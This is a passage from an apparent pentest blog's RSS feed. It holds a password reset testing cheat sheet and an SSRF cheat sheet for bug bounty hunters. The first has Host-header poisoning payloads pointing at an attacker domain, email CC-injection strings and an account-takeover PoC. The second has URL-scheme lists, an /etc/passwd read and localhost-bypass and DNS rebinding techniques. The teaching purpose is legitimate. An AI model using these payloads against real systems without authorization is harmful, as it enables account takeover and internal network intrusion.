&lt;p&gt;If you are assessing an application from the Play Store then you can install open gapps in GenyMotion by clickin on the icon on the right hand menu.&lt;/p&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Password Reset Testing Cheat Sheet</title>
          <link>https://highon.coffee/blog/password-reset-security-testing-cheat-sheet/</link>
          <pubDate>Tue, 01 Jun 2021 03:29:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Authentication</category>
          
          <category>Web Application Penetration Testing</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/password-reset-security-testing-cheat-sheet/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#header-poisoning&quot; id=&quot;markdown-toc-header-poisoning&quot;&gt;Header Poisoning&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#host-header-injection-password-reset-url&quot; id=&quot;markdown-toc-host-header-injection-password-reset-url&quot;&gt;Host: Header Injection Password Reset URL&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#potential-vulnerable-headers&quot; id=&quot;markdown-toc-potential-vulnerable-headers&quot;&gt;Potential Vulnerable Headers&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#host-header-password-reset&quot; id=&quot;markdown-toc-host-header-password-reset&quot;&gt;Host Header Password Reset&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#double-host-header&quot; id=&quot;markdown-toc-double-host-header&quot;&gt;Double Host Header&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#x-forwarded-host-header&quot; id=&quot;markdown-toc-x-forwarded-host-header&quot;&gt;X-Forwarded-Host Header&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#confirm-vulnerable&quot; id=&quot;markdown-toc-confirm-vulnerable&quot;&gt;Confirm Vulnerable&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#poc&quot; id=&quot;markdown-toc-poc&quot;&gt;PoC&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#password-reset-token-filter-bypass&quot; id=&quot;markdown-toc-password-reset-token-filter-bypass&quot;&gt;Password Reset Token Filter Bypass&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#email-parameter-manipulation&quot; id=&quot;markdown-toc-email-parameter-manipulation&quot;&gt;Email Parameter Manipulation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#password-change-functions&quot; id=&quot;markdown-toc-password-change-functions&quot;&gt;Password Change Functions&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#intercept--change-the-email&quot; id=&quot;markdown-toc-intercept--change-the-email&quot;&gt;Intercept &amp;amp; Change the Email&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#password-reset-functons&quot; id=&quot;markdown-toc-password-reset-functons&quot;&gt;Password Reset Functons&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#add-second-email&quot; id=&quot;markdown-toc-add-second-email&quot;&gt;Add Second Email&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#password-token-referral-header-leak&quot; id=&quot;markdown-toc-password-token-referral-header-leak&quot;&gt;Password Token Referral Header Leak&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#check-list&quot; id=&quot;markdown-toc-check-list&quot;&gt;Check List&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following document outlines some key techniques used when assessing password reset function on modern web application and API’s, a useful resource for bug bounty hunters and penetration testers when performing password reset security testing.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;header-poisoning&quot;&gt;Header Poisoning&lt;/h2&gt;

&lt;h3 id=&quot;host-header-injection-password-reset-url&quot;&gt;Host: Header Injection Password Reset URL&lt;/h3&gt;

&lt;p&gt;The following headers can be modified in an attempt to modify the password reset token URL to an attacker controlled domain. Potentially allowing an attacker to obtain the reset token when a user clicks the link to perform a password reset.&lt;/p&gt;

&lt;h4 id=&quot;potential-vulnerable-headers&quot;&gt;Potential Vulnerable Headers&lt;/h4&gt;

&lt;h5 id=&quot;host-header-password-reset&quot;&gt;Host Header Password Reset&lt;/h5&gt;

&lt;p&gt;Replace the Host: header with a server you control.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
Host: attackers-domain.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h5 id=&quot;double-host-header&quot;&gt;Double Host Header&lt;/h5&gt;

&lt;p&gt;Often when you modify the Host header the application, or WAF fails to the process the request, a technique which can potentially bypass this filter if to simply add a second Host header to the request.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Host: target.com
Host: attackers-domain.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h5 id=&quot;x-forwarded-host-header&quot;&gt;X-Forwarded-Host Header&lt;/h5&gt;

&lt;p&gt;Add an attacker controlled domain in the X-forwarded-Host header directive.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Host: target.com 
X-Forwarded-Host: attackers-domain.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;confirm-vulnerable&quot;&gt;Confirm Vulnerable&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;Perform a password reset normally, and modify the host header with a different url&lt;/li&gt;
  &lt;li&gt;Check the email sent by the application has the test url, not the applications url&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;Replace vulnerable header with the attacker controlled domain&lt;/li&gt;
  &lt;li&gt;Send the request&lt;/li&gt;
  &lt;li&gt;Wait for the victim to click reset link (or show PoC to a second account)&lt;/li&gt;
  &lt;li&gt;Exatract the token from the webserver logs you control&lt;/li&gt;
  &lt;li&gt;Use the extracted token to take over the user account&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;password-reset-token-filter-bypass&quot;&gt;Password Reset Token Filter Bypass&lt;/h2&gt;

&lt;p&gt;If the app is built on ruby, try adding a .json extension to the end of the password reset URL. In certain circumstances ACL bugs may exist, adding the extension could potentially bypass any additional layers of protection the application has in in place.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Add a .json to the reset token&lt;/li&gt;
  &lt;li&gt;Observe the applications response to see if the&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;email-parameter-manipulation&quot;&gt;Email Parameter Manipulation&lt;/h2&gt;

&lt;h3 id=&quot;password-change-functions&quot;&gt;Password Change Functions&lt;/h3&gt;

&lt;h4 id=&quot;intercept--change-the-email&quot;&gt;Intercept &amp;amp; Change the Email&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;Interecept the request, and replace the email address to one that you control&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;password-reset-functons&quot;&gt;Password Reset Functons&lt;/h3&gt;

&lt;h4 id=&quot;add-second-email&quot;&gt;Add Second Email&lt;/h4&gt;

&lt;p&gt;Vulnerable applications can be manipulated to send password reset codes to multiple email addresses.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Interecept the request, and add a second email address to the request&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;amp;
%20
|
%0a%0dcc:
%0a%0dbcc:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Modify the parameter matching the applications format, example:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
&lt;span class=&quot;nv&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;victim@mail.tld&quot;&lt;/span&gt;,email&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;attacker@mail.tld&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Match the API Request Schema&lt;/h5&gt;
  &lt;p&gt;Match the application / API's request formatting when adding the additional email address.&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;password-token-referral-header-leak&quot;&gt;Password Token Referral Header Leak&lt;/h2&gt;

&lt;p&gt;Vulnerable applications leak the password reset URL via the referal header.&lt;/p&gt;

&lt;p&gt;Assess the target using an intercepting proxy to identify if the referral header leaks the token through the referral header.&lt;/p&gt;

&lt;h2 id=&quot;check-list&quot;&gt;Check List&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Host Header Injection Password Reset Function&lt;/li&gt;
  &lt;li&gt;Double Host Header Injection Password Reset Function&lt;/li&gt;
  &lt;li&gt;X-Forwarded-Host Header Injection Password Reset Function&lt;/li&gt;
  &lt;li&gt;Email Parameter Manipulation &lt;em&gt;add attacker controller second email address&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;

</description>
        </item>
        
      
    
      
        
        <item>
          <title>SSRF Cheat Sheet &amp; Bypass Techniques</title>
          <link>https://highon.coffee/blog/ssrf-cheat-sheet/</link>
          <pubDate>Sun, 30 May 2021 09:29:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>SSRF</category>
          
          <category>Web Application Penetration Testing</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/ssrf-cheat-sheet/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#what-is-ssrf&quot; id=&quot;markdown-toc-what-is-ssrf&quot;&gt;What is SSRF?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#identifying-potential-locations-for-ssrf&quot; id=&quot;markdown-toc-identifying-potential-locations-for-ssrf&quot;&gt;Identifying Potential Locations for SSRF&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-to-find-ssrf-vulnerabilities&quot; id=&quot;markdown-toc-how-to-find-ssrf-vulnerabilities&quot;&gt;How to Find SSRF Vulnerabilities&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ssrf-whitelist-filter-bypass&quot; id=&quot;markdown-toc-ssrf-whitelist-filter-bypass&quot;&gt;SSRF Whitelist Filter Bypass&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#timing-difference&quot; id=&quot;markdown-toc-timing-difference&quot;&gt;Timing Difference&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#url-schema--wrappers&quot; id=&quot;markdown-toc-url-schema--wrappers&quot;&gt;URL Schema / Wrappers&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#php-ssrf-wrappers--url-schema&quot; id=&quot;markdown-toc-php-ssrf-wrappers--url-schema&quot;&gt;PHP SSRF Wrappers / URL Schema&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#aspnet-ssrf-wrappers--url-schema&quot; id=&quot;markdown-toc-aspnet-ssrf-wrappers--url-schema&quot;&gt;ASP.NET SSRF Wrappers / URL Schema&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#java-ssrf-wrappers--url-schema&quot; id=&quot;markdown-toc-java-ssrf-wrappers--url-schema&quot;&gt;Java SSRF Wrappers / URL Schema&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#curl-ssrf-wrappers--url-schema&quot; id=&quot;markdown-toc-curl-ssrf-wrappers--url-schema&quot;&gt;cURL SSRF Wrappers / URL Schema&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#open-redirect-ssrf-bypass&quot; id=&quot;markdown-toc-open-redirect-ssrf-bypass&quot;&gt;Open Redirect SSRF Bypass&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#basic-locahost-bypass-attempts&quot; id=&quot;markdown-toc-basic-locahost-bypass-attempts&quot;&gt;Basic locahost bypass attempts&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#hosts-file-bypass-attempts&quot; id=&quot;markdown-toc-hosts-file-bypass-attempts&quot;&gt;hosts file bypass attempts&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#enclosed-alphanumeric&quot; id=&quot;markdown-toc-enclosed-alphanumeric&quot;&gt;Enclosed Alphanumeric&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#dns-rebinding-attempts&quot; id=&quot;markdown-toc-dns-rebinding-attempts&quot;&gt;DNS rebinding attempts&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#what-is-a-dns-rebinding-attack&quot; id=&quot;markdown-toc-what-is-a-dns-rebinding-attack&quot;&gt;What is a DNS rebinding attack?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#how-to-exploit-a-vulnerable-function&quot; id=&quot;markdown-toc-how-to-exploit-a-vulnerable-function&quot;&gt;How to exploit a vulnerable function&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#post-exploitation--enumeration&quot; id=&quot;markdown-toc-post-exploitation--enumeration&quot;&gt;Post Exploitation / Enumeration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;what-is-ssrf&quot;&gt;What is SSRF?&lt;/h2&gt;

&lt;p&gt;Server Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to exploit vulnerable functionality to access server side or local network services / functionality by affectively traversing the external firewall using vulnerable web functionality.&lt;/p&gt;

&lt;p&gt;Another way to think of this would be to imagine the web applications vulnerable function is a web browser, that will allow you to pivot / relay request to the internal interface addresses, loopback or internal network to access services (effectively traversing the WAF or firewall).&lt;/p&gt;

&lt;p&gt;An example of this could be a web function that allows the adding of a URL or third-party service, this could then be exploited to access internal or local IP address.&lt;/p&gt;

&lt;p&gt;After identifying SSRF on applications running modern frameworks or a WAF, more work will be required in an effort to defeat the protection / filtering that is in place, and allow for successful SSRF exploitation.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;identifying-potential-locations-for-ssrf&quot;&gt;Identifying Potential Locations for SSRF&lt;/h2&gt;

&lt;p&gt;Any functionality that allows external service interaction is a good stating point, any where that accepts a third party URL or service integration.&lt;/p&gt;

&lt;h2 id=&quot;how-to-find-ssrf-vulnerabilities&quot;&gt;How to Find SSRF Vulnerabilities&lt;/h2&gt;

&lt;p&gt;In order to identify a SSRF vulnerability the first step is confirming that the functionality is vulnerable, an easy / scalable way to do this &lt;a href=&quot;https://www.linode.com/?r=de68d06f20e245c4952795b3a57180b223ff4d42&quot; rel=&quot;nofollow&quot;&gt;is using your own Burp Collaborator on Linode using this link to get a  $100 voucher&lt;/a&gt;. Burp Collaborator will easily allow you to assess if out-of-band interaction is possible (the target server directly accessing a server you control).&lt;/p&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;PRO TIP: Run Your Own Collaborator Server&lt;/h5&gt;
  &lt;p&gt;If you are taking part in bug bounty programs run your own Burp Collaborator  server as often the default Burp Collaborator service domain is filtered, giving you an increased chance of detection.&lt;/p&gt;
    
    &lt;p&gt;&lt;a href=&quot;https://www.linode.com/?r=de68d06f20e245c4952795b3a57180b223ff4d42&quot; rel=&quot;nofollow&quot;&gt;Linode works great for this&lt;/a&gt;, it's cheap, fixed price and has a direct public IP address.&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;It should be noted that a function may still, potentially be vulnerable even if not identifid via Burp Collaborator, this is typically due to the target server not allowing outbound dns or strict egress firewall rules.&lt;/p&gt;

&lt;h2 id=&quot;ssrf-whitelist-filter-bypass&quot;&gt;SSRF Whitelist Filter Bypass&lt;/h2&gt;

&lt;h3 id=&quot;timing-difference&quot;&gt;Timing Difference&lt;/h3&gt;

&lt;p&gt;At the detection phase, try timing difference on responses to see if there is filtering in place when different domains, IP’s or ports are being fitlered.&lt;/p&gt;

&lt;h3 id=&quot;url-schema--wrappers&quot;&gt;URL Schema / Wrappers&lt;/h3&gt;

&lt;p&gt;The following URL schemas can be potentially exploited by SSRF vulnerabilies.&lt;/p&gt;

&lt;p&gt;The URL schemas have been sorted by framework / language.&lt;/p&gt;

&lt;h4 id=&quot;php-ssrf-wrappers--url-schema&quot;&gt;PHP SSRF Wrappers / URL Schema&lt;/h4&gt;

&lt;p&gt;The following wrappers are potentiall expected URL schema wrappers found within PHP environments (for some schema curl-wrappers would need to be enabled).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gopher://
fd://
expect://
ogg://
tftp://
dict://
ftp://
ssh2://
file://
http://
https://
imap://
pop3://
mailto://
smtp://
telnet://&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;aspnet-ssrf-wrappers--url-schema&quot;&gt;ASP.NET SSRF Wrappers / URL Schema&lt;/h4&gt;

&lt;p&gt;The following wrappers are potentiall expected URL schema wrappers found within ASP.NET environments (gopher legacy only).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gopher://
ftp://
file://
http://
https://&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;java-ssrf-wrappers--url-schema&quot;&gt;Java SSRF Wrappers / URL Schema&lt;/h4&gt;

&lt;p&gt;The following wrappers are expected within Java environments, and can be used to potentially exploit &lt;a href=&quot;https://highon.coffee/blog/lfi-cheat-sheet/&quot;&gt;LFI&lt;/a&gt; vulnerabilities.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
ftp://
file://
http://
https://
gopher://
netdoc:///etc/passwd
netdoc:///etc/hosts
jar:proto-schema://blah!/
jar:http://localhost!/
jar:http://127.0.0.1!/
jar:http://0.0.0.0!/
jar:ftp://local-domain.com!/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;NOTE: OpenJDK 8+ Redirects&lt;/h5&gt;
  &lt;p&gt;It should be noted that OpenJDK 8+ does not follow redirects if the protocols do not match. &lt;/p&gt;
&lt;/div&gt;

&lt;h4 id=&quot;curl-ssrf-wrappers--url-schema&quot;&gt;cURL SSRF Wrappers / URL Schema&lt;/h4&gt;

&lt;p&gt;The following wrappers are expected with environments using cURL.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;file:///
dict://
sftp://
ldap://
tftp://
gopher://
ssh://
http://
https://
imap://
pop3://
smtp://
telnet://&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;open-redirect-ssrf-bypass&quot;&gt;Open Redirect SSRF Bypass&lt;/h3&gt;

&lt;p&gt;Open redirects can potentially be used to bypass server side whitelist filtering, by appearing to be from the target domain (which has an increased chance of being whitelisted).&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/foo/bar?vuln-function&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://127.0.0.1:8888/secret&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;basic-locahost-bypass-attempts&quot;&gt;Basic locahost bypass attempts&lt;/h3&gt;

&lt;p&gt;Localhost bypass:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;All IPv4: 0
All IPv6: ::
All IPv4: 0.0.0.0
Localhost IPv6: ::1
All IPv4: 0000
All IPv4: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Leading zeros&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 00000000
IPv4 mapped IPv6 address: 0:0:0:0:0:FFFF:7F00:0001
8-Bit Octal conversion: 0177.00.00.01
32-Bit Octal conversion: 017700000001
32-Bit Hex conversion: 0x7f000001&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;various bypasses:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
127.1:80
0
0.0.0.0:80
localhost:80
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;::]:80/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;::]:25/ SMTP
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;::]:3128/ Squid
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0000::1]:80/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;@127.0.0.1
127.0.0.1#&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.127.0.0.1
127.0.0.1/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
127.0.0.1/?d&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;@127.0.0.1
127.0.0.1#&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.127.0.0.1
127.0.0.1/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
127.0.0.1/?d&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;@localhost
localhost#&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.localhost
localhost/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
localhost/?d&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
127.0.0.1%00&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
127.0.0.1?&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
127.0.0.1///&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
127.0.0.1%00&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
127.0.0.1?&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
127.0.0.1///&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;domain&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &amp;amp;@2.2.2.2# @3.3.3.3/
127.1.1.1:80&lt;span class=&quot;se&quot;&gt;\@&lt;/span&gt;127.2.2.2:80/
127.1.1.1:80&lt;span class=&quot;se&quot;&gt;\@&lt;/span&gt;@127.2.2.2:80/
127.1.1.1:80:&lt;span class=&quot;se&quot;&gt;\@&lt;/span&gt;@127.2.2.2:80/
127.1.1.1:80#&lt;span class=&quot;se&quot;&gt;\@&lt;/span&gt;127.2.2.2:80/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;hosts-file-bypass-attempts&quot;&gt;hosts file bypass attempts&lt;/h3&gt;

&lt;h3 id=&quot;enclosed-alphanumeric&quot;&gt;Enclosed Alphanumeric&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;dns-rebinding-attempts&quot;&gt;DNS rebinding attempts&lt;/h2&gt;

&lt;h3 id=&quot;what-is-a-dns-rebinding-attack&quot;&gt;What is a DNS rebinding attack?&lt;/h3&gt;

&lt;p&gt;In certain situations a target function may check a hostname “blindly” against a whitelist/blacklist without verification of the the resolution IP address. Once the hostname has been determined OK by the above function it is then passed to the function which it is intended to protect.&lt;/p&gt;

&lt;h3 id=&quot;how-to-exploit-a-vulnerable-function&quot;&gt;How to exploit a vulnerable function&lt;/h3&gt;

&lt;p&gt;You can setup a DNS server that resolves to the whitelist, then have a short TTL which changes to the IP you want to exploit e.g. 127.0.0.1 for SSRF, or any other internal IP.&lt;/p&gt;

&lt;p&gt;Fortunately taviso has built a &lt;a href=&quot;https://github.com/taviso/rbndr&quot;&gt;service for this&lt;/a&gt; which you can use to generate a dword subdomain and use against your target. The downside to this service is that it appears to flip the resolution IP back and forth, so it may change during the attack.&lt;/p&gt;

&lt;p&gt;You can use the follow web app to generate your rebinder domain: https://lock.cmpxchg8b.com/rebinder.html&lt;/p&gt;

&lt;p&gt;To overcome this issue, have one of the resolution IP addresses in your control and verify the response of that IP request, to help determine if the target functionality is vulnerable.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;go to https://lock.cmpxchg8b.com/rebinder.html add your IP’s&lt;/li&gt;
  &lt;li&gt;check it works with host&lt;/li&gt;
  &lt;li&gt;attempt to exploit the SSRF location with it&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;post-exploitation--enumeration&quot;&gt;Post Exploitation / Enumeration&lt;/h2&gt;

&lt;p&gt;In an effort to demonstrate the severity of the SSRF vulnerability enumeration of server side ports could be performed using Burp Intruder.&lt;/p&gt;

&lt;p&gt;The above process could be performed to enumerate other local IP addresses and/or bruteforcing URL (IDOR / Forced Browsing) to identify services or functionality that was not intended by the organisation.&lt;/p&gt;

&lt;p&gt;Happy hunting / pen testing.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Pen Testing Tools Cheat Sheet</title>
          <link>https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</link>
          <pubDate>Mon, 16 Mar 2020 14:22:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Windows</category>
          
          <category>SMB</category>
          
          <category>Linux</category>
          
          <category>Tools</category>
          
          <category>Penetration Testing</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</guid>
          <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

